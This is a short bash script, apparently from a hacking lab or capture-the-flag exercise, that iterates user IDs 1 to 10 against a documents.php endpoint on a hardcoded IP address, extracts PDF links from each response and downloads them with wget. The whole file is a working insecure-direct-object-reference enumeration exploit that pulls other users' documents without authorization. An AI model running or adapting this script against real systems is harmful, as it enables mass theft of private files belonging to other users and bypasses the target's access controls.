#!/bin/bash

url="http://94.237.48.48:51304"

for i in {1..10}; do
        for link in $(curl -s -X POST "$url/documents.php" -d "uid=$i" | grep -o "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done